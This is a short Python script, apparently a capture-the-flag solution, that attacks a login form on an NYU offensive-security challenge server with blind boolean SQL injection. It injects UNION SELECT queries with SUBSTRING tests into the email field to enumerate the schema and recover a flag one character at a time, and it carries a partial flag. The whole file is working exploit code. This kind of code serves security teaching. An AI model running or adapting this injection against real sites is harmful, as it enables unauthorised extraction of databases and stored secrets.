import requests, time

cookie = {'CHALBROKER_USER_ID':'svv232'} 
url = "http://offsec-chalbroker.osiris.cyber.nyu.edu:1241/login.php/"
r = requests.post(url,cookies=cookie)

if r.status_code == 200:
    print("Successful connection")
else:
    print("Noo connection")
    quit()

def response(query):
    payload = {'email':" '{}".format(query) ,'password': "uselesstext"}
    r = requests.post(url,cookies=cookie,data = payload)
    x =  "No such user!" not in r.text
    return x

#id,value,
def schema_names():
    column_name = "flag{1_R3ALLY_D0NT_HAVE_A_G00D_ID3A_FOR"
    for j in range(40,100):
       for i in range(70,127):
           letter = chr(i)
           if ((i == 92) or (i == 39)):
               continue;
           #query = "UNION SELECT 1,1,table_name from information_schema.tables where table_schema not in ('performance_schema','information_schema') and IF(SUBSTRING(table_name,{},1) = '{}',1,0) LIMIT 1 OFFSET 0-- ".format(j,letter);
           #query = "UNION SELECT 1,1,column_name from information_schema.columns where table_name ='secrets' and column_name != 'id' and column_name != 'value' and IF(SUBSTRING(column_name,1,{})='{}',1,0) LIMIT 1 OFFSET 0-- ".format(j,column_name+letter);         
           query = "UNION SELECT 1,1,1 from secrets where IF(SUBSTRING(value,{},1)='{}',1,0) LIMIT 1 OFFSET 0-- ".format(j,letter);
           print(letter)
           if response(query):
               column_name += letter
               print(column_name)
               break
           
schema_names()
